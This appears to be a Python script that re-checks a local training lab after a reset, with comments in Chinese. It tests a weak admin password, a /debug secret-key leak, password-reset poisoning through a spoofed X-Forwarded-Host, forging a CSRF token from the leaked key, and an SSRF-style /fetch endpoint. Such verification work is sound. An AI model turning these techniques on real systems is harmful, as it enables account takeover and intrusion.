# -*- coding: utf-8 -*-
"""mentor 复核：复位后（2026-10-12）VULN-02/03/04 存活判定 + 8091 面复核。
只做只读探测：不转账、不改密、不调 /__reset。"""
import urllib.request, urllib.parse, urllib.error, re, hashlib, hmac, json

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None

OP = urllib.request.build_opener(NoRedirect)


def req(base, path, data=None, headers=None, cookie=None):
    h = dict(headers or {})
    if cookie:
        h["Cookie"] = "token=" + cookie
    body = None
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, bytes):
        body = data
    r = urllib.request.Request(base + path, data=body, headers=h)
    try:
        resp = OP.open(r, timeout=10)
        return resp.getcode(), resp.read().decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
    except Exception as e:  # noqa
        return -1, "EXC:%r" % (e,), {}


out = {"at": "2026-10-12", "lab": "http://127.0.0.1:8095", "v2": "http://127.0.0.1:8091"}

# 1) 弱口令是否已随复位失效
r1 = {}
for pw in ("admin123", "Lab@Admin2024!Secure#9"):
    c, b, h = req("http://127.0.0.1:8095", "/login", {"username": "admin", "password": pw})
    r1[pw] = {"status": c, "set_cookie": h.get("Set-Cookie", "")[:50]}
out["vuln01_weakpass"] = r1

tok = None
sc = r1["Lab@Admin2024!Secure#9"]["set_cookie"]
m = re.search(r"token=([^;]+)", sc)
if m:
    tok = m.group(1)

# 2) /debug 是否仍泄露
c, b, h = req("http://127.0.0.1:8095", "/debug", cookie=tok)
out["vuln02_debug"] = {"status": c, "has_secret_key": "SECRET_KEY" in b, "body_head": b[:200]}
sec = None
mm = re.search(r"lab-secret-key[a-zA-Z0-9\-]*", b)
if mm:
    sec = mm.group(0)

# 3) /forgot Host 头 + md5 可预测
c, b, h = req("http://127.0.0.1:8095", "/forgot?username=admin",
              headers={"X-Forwarded-Host": "evil.example"})
mm = re.search(r"reset\?user=([^&\"\s]+)&token=([0-9a-f]+)", b)
out["vuln04_forgot"] = {
    "status": c,
    "reflected_evil_host": "evil.example" in b,
    "token_in_body": mm.groups() if mm else None,
    "md5_of_username": hashlib.md5(b"admin").hexdigest(),
}

# 4) CSRF 伪造 vs 页面真实值（不提交任何写操作）
c2, b2, _ = req("http://127.0.0.1:8095", "/change-password", cookie=tok)
real = re.search(r'name="csrf_token" value="([0-9a-f]+)"', b2)
forged = None
if sec and tok:
    forged = hmac.new(sec.encode(), tok.encode(), hashlib.sha256).hexdigest()
out["vuln03_csrf_forge"] = {
    "page_status": c2,
    "real_csrf": real.group(1) if real else None,
    "forged_csrf": forged,
    "equal": bool(real and forged and real.group(1) == forged),
}

# 5) 8091 面复核（只读）
v2 = {}
for p in ("/debug", "/forgot?username=admin", "/fetch?url=http://127.0.0.1:8095/"):
    c, b, h = req("http://127.0.0.1:8091", p)
    v2[p] = {"status": c, "len": len(b)}
out["target8091_probe"] = v2

print(json.dumps(out, ensure_ascii=False, indent=2))
